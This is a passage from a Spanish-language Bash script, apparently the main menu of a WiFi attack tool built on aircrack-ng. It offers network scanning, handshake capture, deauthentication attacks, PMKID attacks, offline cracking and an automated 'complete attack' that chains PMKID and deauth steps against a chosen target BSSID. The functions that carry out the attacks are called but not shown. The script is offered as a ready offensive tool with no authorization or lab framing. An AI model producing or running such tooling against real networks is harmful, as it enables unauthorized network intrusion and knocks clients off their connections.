        echo -e "${BLUE}║${NC} ${CYAN}1.${NC}  🔧 Configurar Interface WiFi                                    ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}2.${NC}  🔍 Escanear Redes WPA/WPA2                                     ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}3.${NC}  🎣 Captura Pasiva de Handshake                                 ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}4.${NC}  ⚡ Ataque de Deautenticación                                    ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}5.${NC}  💥 PMKID Attack (sin deauth)                                   ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}6.${NC}  🔓 Crack Handshake Offline                                     ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}7.${NC}  🎯 Ataque Completo Automatizado                                ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}8.${NC}  📊 Ver Resumen de Resultados                                   ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}0.${NC}  🚪 Salir                                                        ${BLUE}║${NC}"
        echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        
        if [[ -n "$INTERFACE" ]]; then
            echo -e "\n${GREEN}📡 Interface: $INTERFACE${NC}"
        fi
        
        if [[ -n "$TARGET_BSSID" ]]; then
            echo -e "${GREEN}🎯 Objetivo: $TARGET_ESSID ($TARGET_BSSID)${NC}"
        fi
        
        echo ""
        read -p "Selecciona una opción (0-8): " choice
        
        case $choice in
            1) check_interface ;;
            2) 
                [[ -z "$INTERFACE" ]] && check_interface
                scan_networks
                read -p "Presiona Enter para continuar..."
                ;;
            3)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_BSSID" ]] && scan_networks
                ATTACK_TYPE="passive"
                setup_output_directory
                execute_passive_capture
                show_results_summary
                read -p "Presiona Enter para continuar..."
                ;;
            4)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_BSSID" ]] && scan_networks
                ATTACK_TYPE="deauth"
                select_attack_method
                setup_output_directory
                execute_deauth_attack
                show_results_summary
                read -p "Presiona Enter para continuar..."
                ;;
            5)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_BSSID" ]] && scan_networks
                ATTACK_TYPE="pmkid"
                setup_output_directory
                execute_pmkid_attack
                show_results_summary
                read -p "Presiona Enter para continuar..."
                ;;
            6)
                select_existing_handshake
                select_wordlist
                crack_handshake
                read -p "Presiona Enter para continuar..."
                ;;
            7)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_BSSID" ]] && scan_networks
                echo -e "${YELLOW}🚀 Ejecutando ataque completo automatizado...${NC}"
                setup_output_directory
                
                # Intentar todos los métodos
                execute_pmkid_attack
                sleep 5
                execute_deauth_attack
                
                show_results_summary
                read -p "Presiona Enter para continuar..."
                ;;
            8)
                if [[ -n "$OUTPUT_DIR" ]]; then
                    show_results_summary
                else
                    echo -e "${YELLOW}⚠️ No hay resultados para mostrar${NC}"
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            0)
                echo -e "${GREEN}👋 ¡Hasta luego!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}❌ Opción inválida${NC}"
                sleep 1
                ;;
        esac
    done
}

# Verificar herramientas necesarias
missing_tools=()
for tool in aircrack-ng iwconfig; do
    if ! command -v "$tool" &> /dev/null; then
        missing_tools+=("$tool")
    fi
done

if [[ ${#missing_tools[@]} -gt 0 ]]; then
    echo -e "${RED}❌ Herramientas faltantes: ${missing_tools[*]}${NC}"
    echo -e "${YELLOW}💡 Instala con: sudo apt install aircrack-ng wireless-tools${NC}"
    exit 1
fi

# Verificar permisos de root
if [[ $EUID -ne 0 ]]; then
    echo -e "${YELLOW}⚠️ Se requieren permisos de root para la mayoría de funciones${NC}"
    echo -e "${CYAN}💡 Ejecuta como: sudo $0${NC}"
    read -p "¿Continuar de todos modos? (y/N): " continue_anyway
    [[ $continue_anyway != [yY] ]] && exit 1
fi

# Ejecutar menú principal
main_menu